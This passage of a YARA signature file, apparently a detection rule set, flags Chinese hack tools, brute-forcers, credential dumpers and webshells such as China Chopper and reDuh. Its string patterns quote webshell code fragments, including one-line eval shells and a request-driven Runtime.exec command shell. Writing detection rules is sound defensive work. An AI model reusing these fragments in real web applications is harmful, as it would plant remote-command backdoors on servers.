      description = "Chinese Hacktool Set - file Arp EMP v1.0.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:49:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Arp EMP v1.0.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them
} 

rule HTTPSCANNER_RID2A5B : DEMO EXE FILE HKTL T1086 T1136 {
   meta:
      description = "Chinese Hacktool Set - file HTTPSCANNER_RID2A5B.EXE"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 05:23:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "HttpScanner.exe" fullword wide
      $s2 = "HttpScanner" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3500KB and all of them
} 

rule PLUGIN_AJunk_RID2B18 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file AJunk.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:51:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "AJunk.dll" fullword ascii
      $s2 = "AJunk.DLL" fullword wide
      $s3 = "AJunk Dynamic Link Library" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 560KB and all of them
} 

rule Tools_scan_RID2B26 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file scan.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:54:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Shanlu Studio" fullword wide
      $s3 = "_AutoAttackMain" fullword ascii
      $s4 = "_frmIpToAddr" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
} 

rule IISPutScannesr_RID2C6C : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file IISPutScannesr_RID2C6C.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:48:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "yoda & M.o.D." ascii
      $s2 = "-> come.to/f2f **************" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them
} 

rule Webshell_Tools_JSP_cmd_RID2F96 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file cmd.jSp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 12:03:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
      $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"Conn\"" ascii
      $s2 = "<%@ page import=\"java.io.*\" %>" fullword ascii
      $s3 = "out.print(\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\");" fullword ascii
      $s4 = "while((a=in.read(b))!=-1){" fullword ascii
      $s5 = "out.println(new String(b));" fullword ascii
      $s6 = "out.print(\"</pre>\");" fullword ascii
      $s7 = "out.print(\"<pre>\");" fullword ascii
      $s8 = "int a = -1;" fullword ascii
      $s9 = "byte[] b = new byte[2048];" fullword ascii
   condition: 
      filesize < 3KB and 7 of them
} 

rule Webshell_InjectionParameters_RID325D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file InjectionParameters.vb"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:02:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
      $s1 = "Public Class InjectionParameters" fullword ascii
   condition: 
      filesize < 13KB and all of them
} 

rule Webshell_Customize_4_RID2EFC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file Customize.aspx"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:37:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex" ascii
      $s2 = "c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr" ascii
      $s3 = "Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create" ascii
      $s4 = "R=\"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";}Conn.Close();break;" ascii
   condition: 
      filesize < 24KB and all of them
} 

rule Webshell_oracle_data_RID2F15 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file oracle_data.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:42:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
      $s1 = "if(isset($_REQUEST['id']))" fullword ascii
      $s2 = "$id=$_REQUEST['id'];" fullword ascii
   condition: 
      all of them
} 

rule Webshell_reDuhServers_reDuh_RID31DF : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file reDuh.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:41:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
      $s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii
      $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
      $s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
   condition: 
      filesize < 116KB and all of them
} 

rule Webshell_item_old_RID2DF3 : DEMO T1100 T1105 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file item-old.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:53:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1105, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
      $s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
      $s3 = "$sHash = md5($sURL);" fullword ascii
   condition: 
      filesize < 7KB and 2 of them
} 

rule Webshell_Tools_2014_RID2DDD : DEMO T1007 T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file 2014.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:50:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1007, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
      $s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
      $s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
   condition: 
      filesize < 715KB and all of them
} 

rule Webshell_reDuhServers_reDuh_2_RID3270 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file reDuh.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:05:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
      $s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
      $s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
   condition: 
      filesize < 57KB and all of them
} 

rule Webshell_Customize_5_RID2EFD : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file Customize.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:38:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
      $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
   condition: 
      filesize < 30KB and all of them
} 

rule Webshell_CN_Tools_old_RID2F45 : CHINA DEMO T1100 T1105 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file old.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:50:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1105, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
      $s1 = "$sURL = \"http://\".$sServer.\"/\".$sFile;" fullword ascii
      $s2 = "chmod(\"/\".substr($sHash, 0, 2), 0777);" fullword ascii
      $s3 = "$sCmd = \"echo 123> \".$sFileOut;" fullword ascii
   condition: 
      filesize < 6KB and all of them
} 

rule Webshell_item_301_RID2D48 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file item-301.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:25:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
      $s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
      $s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
      $s4 = "$sURL = $aArg[0];" fullword ascii
   condition: 
      filesize < 3KB and 3 of them
} 

rule Webshell_CN_Tools_item_RID2FB5 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file item.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 12:08:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
      $s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
      $s3 = "$sWget=\"index.asp\";" fullword ascii
      $s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii
   condition: 
      filesize < 4KB and all of them
} 

rule Webshell_ChinaChopper_temp_RID316F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file temp.asp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:22:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
      $s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
      $s2 = "o.language = \"vbscript\"" fullword ascii
      $s3 = "o.addcode(Request(\"SC\"))" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule Webshell_Tools_2015_RID2DDE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file 2015.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:50:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
      $s4 = "System.out.println(Oute.toString());" fullword ascii
      $s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
      $s8 = "HttpURLConnection httpUrl = null;" fullword ascii
      $s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii
   condition: 
      filesize < 7KB and all of them
} 

rule Webshell_reDuhServers_reDuh_3_RID3271 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file reDuh.aspx"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:05:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Response.Write(\"[Error]Unable to connect to reDuh.jsp main process on port \" +" ascii
      $s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii
      $s3 = "rw.WriteLine(\"[newData]\" + targetHost + \":\" + targetPort + \":\" + socketNum" ascii
      $s4 = "Response.Write(\"Error: Bad port or host or socketnumber for creating new socket" ascii
   condition: 
      filesize < 40KB and all of them
} 

rule Webshell_ChinaChopper_temp_3_RID3201 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file temp.aspx"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:46:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" ascii
      $s1 = "\"],\"unsafe\");%>" ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 150 and all of them
} 

rule mswin_check_lm_group_RID2F60 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file mswin_check_lm_group_RID2F60.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:54:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Valid_Global_Groups: checking group membership of '%s\\%s'." fullword ascii
      $s2 = "Usage: %s [-D domain][-G][-P][-c][-d][-h]" fullword ascii
      $s3 = "-D    default user Domain" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 380KB and all of them
} 

rule WAF_Bypass_RID2AC0 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file WAF-Bypass.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:11:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Email: blacksplitn@gmail.com" fullword wide
      $s2 = "User-Agent:" fullword wide
      $s3 = "Send Failed.in RemoteThread" fullword ascii
      $s4 = "www.example.com" fullword wide
      $s5 = "Get Domain:%s IP Failed." fullword ascii
      $s6 = "Connect To Server Failed." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 7992KB and 5 of them
} 

rule Guilin_veterans_cookie_spoofing_tool_RID35FA : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Guilin veterans cookie spoofing tool.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 16:36:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kernel32.dll^G" fullword ascii
      $s1 = "\\.Sus\"B" fullword ascii
      $s4 = "u56Load3" fullword ascii
      $s11 = "O MYTMP(iM) VALUES (" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1387KB and all of them
} 

rule MarathonTool_RID2BE9 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file MarathonTool_RID2BE9.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:26:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "MarathonTool_RID2BE9" ascii
      $s17 = "/Blind SQL injection tool based in heavy queries" fullword ascii
      $s18 = "SELECT UNICODE(SUBSTRING((system_user),{0},1))" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1040KB and all of them
} 

rule PLUGIN_TracKid_RID2BE1 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file TracKid.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:25:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "E-mail: cracker_prince@163.com" fullword ascii
      $s1 = ".\\TracKid Log\\%s.txt" fullword ascii
      $s2 = "Coded by prince" fullword ascii
      $s3 = "TracKid.dll" fullword ascii
      $s4 = ".\\TracKid Log" fullword ascii
      $s5 = "%08x -- %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them
} 

rule sekurlsa_RID2A7B : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file sekurlsa_RID2A7B.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 06:16:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Bienvenue dans un processus distant" fullword wide
      $s2 = "Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur" wide
      $s3 = "SECURITY\\Policy\\Secrets" fullword wide
      $s4 = "Injection de donn" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1150KB and all of them
} 

rule mysqlfast_RID2AF5 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file mysqlfast_RID2AF5.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:40:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Invalid password hash: %s" fullword ascii
      $s3 = "-= MySql Hash Cracker =- " fullword ascii
      $s4 = "Usage: %s hash" fullword ascii
      $s5 = "Hash: %08lx%08lx" fullword ascii
      $s6 = "Found pass: " fullword ascii
      $s7 = "Pass not found" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 4 of them
} 

rule DTools2_02_DTools_RID2D0D : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file DTools.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:15:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kernel32.dll" ascii
      $s1 = "TSETPASSWORDFORM" fullword wide
      $s2 = "TGETNTUSERNAMEFORM" fullword wide
      $s3 = "TPORTFORM" fullword wide
      $s4 = "ShellFold" fullword ascii
      $s5 = "DefaultPHotLigh" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule dll_PacketX_RID2B5C : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:03:11"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "[Failed to load winpcap packet.dll." wide
      $s10 = "PacketX Version" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1920KB and all of them
} 

rule SqlDbx_zhs_RID2B13 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file SqlDbx_zhs_RID2B13.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:51:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "S.failed_logins \"Failed Login Attempts\", " fullword ascii
      $s7 = "SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE" fullword ascii
      $s8 = "SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'" ascii
      $s9 = "bcp.exe <:schema:>.<:table:> out \"<:file:>\" -n -S <:server:> -U <:user:> -P <:" ascii
      $s11 = "L.login_policy_name AS \"Login Policy\", " fullword ascii
      $s12 = "mailto:support@sqldbx.com" fullword ascii
      $s15 = "S.last_login_time \"Last Login\", " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and 4 of them
} 

rule DUBrute_DUBrute_RID2CA6 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file DUBrute.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:58:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "IP - %d; Login - %d; Password - %d; Combination - %d" fullword ascii
      $s2 = "IP - 0; Login - 0; Password - 0; Combination - 0" fullword ascii
      $s3 = "Create %d IP@Loginl;Password" fullword ascii
      $s4 = "UBrute.com" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1020KB and all of them
} 

rule ChineseHack_Tool_RID2D44 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file CookieTools.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:24:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=" fullword ascii
      $s2 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
      $s3 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
      $s4 = "OnGetPasswordP" fullword ascii
      $s5 = "http://www.chinesehack.org/" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 4 of them
} 

rule update_PcInit_RID2C3A : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file PcInit.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:40:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\svchost.exe" fullword ascii
      $s2 = "%s%08x.001" fullword ascii
      $s3 = "Global\\ps%08x" fullword ascii
      $s4 = "drivers\\" fullword ascii
      $s5 = "StrStrA" fullword ascii
      $s6 = "StrToIntA" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them
} 

rule dat_NaslLib_RID2B4E : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file NaslLib.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:00:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "nessus_get_socket_from_connection: fd <%d> is closed" fullword ascii
      $s2 = "[*] \"%s\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d" fullword ascii
      $s3 = "A FsSniffer backdoor seems to be running on this port%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1360KB and all of them
} 

rule OtherTools_servu_RID2DB8 : DEMO FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file svu.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:43:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "MZKERNEL32.DLL" fullword ascii
      $s1 = "UpackByDwing@" fullword ascii
      $s2 = "GetProcAddress" fullword ascii
      $s3 = "WriteFile" fullword ascii
   condition: 
      uint32 ( 0 ) == 0x454b5a4d and $s0 at 0 and filesize < 50KB and all of them
} 

rule ustrrefadd_RID2B45 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file ustrrefadd_RID2B45.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:59:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "E-Mail  : admin@luocong.com" fullword ascii
      $s1 = "Homepage: http://www.luocong.com" fullword ascii
      $s2 = ": %d  -  " fullword ascii
      $s3 = "ustrreffix.dll" fullword ascii
      $s5 = "Ultra String Reference plugin v%d.%02d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 320KB and all of them
} 

rule XScanLib_RID2A05 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file XScanLib_RID2A05.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 03:00:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "XScanLib_RID2A05.dll" fullword ascii
      $s6 = "Ports/%s/%d" fullword ascii
      $s8 = "DEFAULT-TCP-PORT" fullword ascii
      $s9 = "PlugCheckTcpPort" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 360KB and all of them
} 

rule IDTools_For_WinXP_IdtTool_RID3088 : DEMO EXE FILE HKTL T1136 {
   meta:
